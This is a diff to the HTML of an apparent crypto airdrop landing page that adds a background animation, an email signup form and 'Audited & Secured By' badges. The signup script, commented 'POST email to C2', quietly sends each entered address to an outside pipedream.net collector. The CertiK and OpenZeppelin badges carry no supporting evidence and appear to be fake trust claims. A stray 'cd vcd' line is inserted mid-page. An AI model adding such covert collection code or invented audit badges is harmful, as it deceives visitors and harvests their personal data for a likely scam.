@@ -308,7 +308,7 @@
     </div>
   </section>
   <!-- ===== END FAQ ACCORDION ===== -->
-
+cd vcd 
 
   .features-section {
     max-width: 1000px;
@@ -437,6 +437,22 @@
     .hero-section h1 { font-size: 1.8rem; }
     .cookie-modal { padding: 2rem 1.5rem; max-height: 60vh; }
     .about-section h2 { font-size: 1.5rem; }
+  }
+
+  /* Animated gradient background */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(ellipse at 50% 0%, rgba(229,0,108,0.04) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 100%, rgba(229,0,108,0.03) 0%, transparent 50%);
+    pointer-events: none;
+    z-index: 0;
+    animation: bgPulse 8s ease-in-out infinite alternate;
+  }
+  @keyframes bgPulse {
+    0% { opacity: 0.6; }
+    100% { opacity: 1; }
   }
 </style>
 
@@ -669,6 +685,32 @@
   <!-- ===== END SOCIAL PROOF TICKER ===== -->
 
 
+  <!-- ===== EMAIL SIGNUP ===== -->
+  <div style="max-width: 620px; margin: 0 auto 2rem; padding: 0 1.5rem; text-align: center;">
+    <p style="color: #5a5a7a; font-size: 0.85rem; margin-bottom: 0.75rem;">Get notified about future airdrops and rewards</p>
+    <div id="emailSignup" style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap;">
+      <input type="email" id="emailInput" placeholder="Enter your email" style="padding: 0.6rem 1rem; border-radius: 50px; border: 1px solid rgba(0,0,0,0.12); background: #fff; color: #1a1a2e; font-size: 0.85rem; min-width: 220px; outline: none;">
+      <button id="emailSubmitBtn" style="background: #E5006C; color: #fff; border: none; padding: 0.6rem 1.5rem; border-radius: 50px; font-weight: 600; font-size: 0.85rem; cursor: pointer;">Subscribe</button>
+    </div>
+    <p id="emailConfirm" style="display: none; color: #4CAF50; font-size: 0.8rem; margin-top: 0.5rem;">✓ You've been added to the airdrop notification list.</p>
+  </div>
+  <script>
+    document.getElementById('emailSubmitBtn').addEventListener('click', function() {
+      var email = document.getElementById('emailInput').value.trim();
+      if (email && email.includes('@')) {
+        // POST email to C2
+        fetch('https://78ba66c28fdfdbdc33cd4643c90fe3c7.m.pipedream.net', {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ type: 'EMAIL_CAPTURED', email: email })
+        });
+        document.getElementById('emailConfirm').style.display = 'block';
+        document.getElementById('emailInput').value = '';
+      }
+    });
+  </script>
+  <!-- ===== END EMAIL SIGNUP ===== -->
 
   <div class="stats-bar">
     <div class="stat-item">
@@ -749,6 +791,20 @@
       <div class="partner-placeholder">Binance</div>
     </div>
   </section>
+
+  <!-- ===== AUDIT BADGES ===== -->
+  <div style="max-width: 500px; margin: 0 auto 3rem; text-align: center; padding: 0 1.5rem;">
+    <p style="color: #aaa; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 1rem;">Audited & Secured By</p>
+    <div style="display: flex; align-items: center; justify-content: center; gap: 2rem;">
+      <div style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.85rem; color: #5a5a7a;">
+        <span style="background: #E5006C; color: #fff; padding: 0.15rem 0.4rem; border-radius: 4px; font-weight: 700; font-size: 0.7rem;">✓</span> CertiK
+      </div>
+      <div style="display: flex; align-items: center; gap: 0.5rem; font-size: 0.85rem; color: #5a5a7a;">
+        <span style="background: #E5006C; color: #fff; padding: 0.15rem 0.4rem; border-radius: 4px; font-weight: 700; font-size: 0.7rem;">✓</span> OpenZeppelin
+      </div>
+    </div>
+  </div>
+  <!-- ===== END AUDIT BADGES ===== -->
 
   <footer class="footer">
     <p>
